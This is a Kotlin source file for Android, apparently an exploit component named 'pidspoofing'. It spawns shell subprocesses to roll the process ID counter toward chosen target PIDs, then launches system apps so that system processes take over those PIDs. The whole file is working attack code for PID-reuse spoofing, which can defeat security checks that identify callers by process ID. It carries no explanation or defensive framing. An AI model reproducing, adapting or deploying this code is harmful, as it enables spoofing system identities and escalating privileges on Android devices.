package jp.plum.pidspoofing

import android.app.ActivityThread
import android.content.Intent
import android.content.pm.PackageManager.MATCH_SYSTEM_ONLY
import android.util.Log
import java.util.Collections.min

object Roller {
    private const val TAG = "natsuki"
    private val shell = ProcessBuilder("/system/bin/sh").redirectInput(ProcessBuilder.Redirect.PIPE)
        .redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE)
        .start()
    private val input = shell.inputStream.bufferedReader()
    private val output = shell.outputStream
    private val cmd = "(echo \$BASHPID)\n".toByteArray()

    private fun spawn(): Int {
        output.write(cmd)
        output.flush()
        return input.readLine().toInt()
    }

    fun toPid(pid: Int, anchors: List<Int>) = sequence {
        val first = spawn()
        yieldAll(listOf(first, first))
        while (true) {
            yield(spawn())
        }
    }.windowed(2).map { (last, current) ->
        when {
            last in (pid + 1)..current -> {
                Log.d(TAG, "Overflow Inc: $current, target:$pid")
                false
            }
            pid in (current + 1) until last -> {
                Log.d(TAG, "Rolling: $current, target: $pid")
                false
            }
            current in (last + 1) until pid -> {
                Log.d(TAG, "Inc: $current, target:$pid anchor:$anchors")
                if (current >= min(anchors)) {
                    Log.e(TAG, "will spawn 10 processes to spoofing $anchors")
                    spawnSystemProcess(anchors.size)
                    true
                } else false
            }
            else -> error("not rolling: pid->$pid last->$last current->$current")
        } to current
    }.first { it.first }.second

    fun spawnSystemProcess(toSpawn: Int) {
        val intents = with(ActivityThread.currentApplication().packageManager) {
            getInstalledApplications(MATCH_SYSTEM_ONLY).mapNotNull {
                getLaunchIntentForPackage(
                    it.packageName
                )
            }.take(20)
        }.toTypedArray()
        Log.e(TAG, "system process spawned: ${intents.size} ")
        ActivityThread.currentApplication().startActivities(intents)
        Thread.sleep(1000)
    }

}